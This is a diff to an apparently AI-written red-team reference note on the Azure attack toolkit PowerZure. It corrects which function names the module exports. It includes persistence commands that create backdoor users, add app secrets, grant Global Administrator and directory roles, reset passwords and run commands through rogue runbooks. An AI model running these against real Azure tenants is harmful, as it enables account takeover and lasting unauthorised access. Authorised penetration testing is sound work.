@@ -15,7 +15,7 @@ Install-Module Az -Scope CurrentUser
 Connect-AzAccount
 ```
 
-> [!warning] **Verified against `PowerZure.psm1` (2026-08) — the whole `Get-Az*`/`New-Az*` vocabulary older guides use is WRONG.** PowerZure functions are all `*-Azure*` (e.g. `Get-AzureTarget`, `Get-AzureUser`, `Add-AzureRole`, `Invoke-AzureRunCommand`). The `Get-Az*` names actually belong to **Microsoft's official Az module** — calling them runs a different Microsoft cmdlet (or nothing), not PowerZure. List it with `Invoke-PowerZure -h` or `Get-Command -Module PowerZure`. **Re-verified 2026-09-27 against the repo docs (`docs/Functions/operational.rst` + `infogathering.rst`)** — which caught four more invented names in the persistence section: `New-AzureADUser`→`New-AzureUser`, `Add-AzureADSPSecret`→`Add-AzureSPSecret`, and `Invoke-AzureMIBackdoor` / `Add-AzureADRole` (neither exists).
+> [!warning] **Verified against `PowerZure.psm1` (2026-08) — the whole `Get-Az*`/`New-Az*` vocabulary older guides use is WRONG.** PowerZure functions are all `*-Azure*` (e.g. `Get-AzureTarget`, `Get-AzureUser`, `Add-AzureRole`, `Invoke-AzureRunCommand`). The `Get-Az*` names actually belong to **Microsoft's official Az module** — calling them runs a different Microsoft cmdlet (or nothing), not PowerZure. List it with `Invoke-PowerZure -h` or `Get-Command -Module PowerZure`. **Re-verified 2026-09-27 (docs) and again 2026-09-28 against `PowerZure.psd1` FunctionsToExport.** Confirmed-wrong names: `New-AzureADUser`→`New-AzureUser`, `Add-AzureADSPSecret`→`Add-AzureSPSecret` (the `AD`-infix forms are **not** exported). **Correction to the prior pass:** `Add-AzureADRole` and `Invoke-AzureMIBackdoor` **ARE** exported by the manifest — an earlier revision wrongly flagged them as invented. They exist (lightly documented); confirm their parameters on-box with `Get-Help`. The manifest also exports `Get-AzureDeviceOwner`, `Get-AzureIntuneScript`, `Invoke-AzureVMUserDataAgent`, `Connect-AzureJWT`, and `Start-AzureRunbook`.
 
 > [!note] **PowerZure vs MicroBurst** — Similar scope, different strengths. PowerZure has a more structured workflow and covers more Entra ID attack paths. MicroBurst has broader one-shot credential harvesting (`Get-AzPasswords`). Run both on Azure engagements.
 
@@ -117,17 +117,17 @@ curl -H "Metadata:true" \
 New-AzureBackdoor -Username backdoor -Password 'P@ssw0rd123!'
 
 # New Entra user / add secret to an existing app registration (persistent app auth)
-# (real names have NO "AD" infix — New-AzureADUser / Add-AzureADSPSecret do not exist)
+# (the AD-infix forms New-AzureADUser / Add-AzureADSPSecret are NOT exported — use these)
 New-AzureUser -Username backdoor@company.com -Password 'P@ssw0rd123!'
 Add-AzureSPSecret -AppName <name>             # or -AppID <app-id>
 
-# Add to a privileged group / reset a password
+# Add to a privileged group, add an Entra DIRECTORY role, or reset a password
 Add-AzureGroupMember -Group "Global Administrators" -Username <upn>
+Add-AzureADRole    # exported by the manifest — adds an Entra directory role; confirm params with Get-Help on-box
 Set-AzureUserPassword -Username <upn> -Password 'NewPass123!'
-# NOTE: PowerZure has no directory-role-add cmdlet ("Add-AzureADRole" was invented).
-# Grant an Entra role via AADInternals or MS Graph; PowerZure covers Azure RBAC via Add-AzureRole.
 
-# Run arbitrary commands via a rogue Automation runbook
+# Managed-identity backdoor + arbitrary command via a rogue Automation runbook
+Invoke-AzureMIBackdoor    # exported by the manifest; confirm behaviour/params on-box
 Invoke-AzureCommandRunbook -Command 'whoami'
 ```
 
@@ -138,5 +138,5 @@ Invoke-AzureCommandRunbook -Command 'whoami'
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-27*
+*Updated: 2026-09-28*
 *Model: claude-opus-4-8*
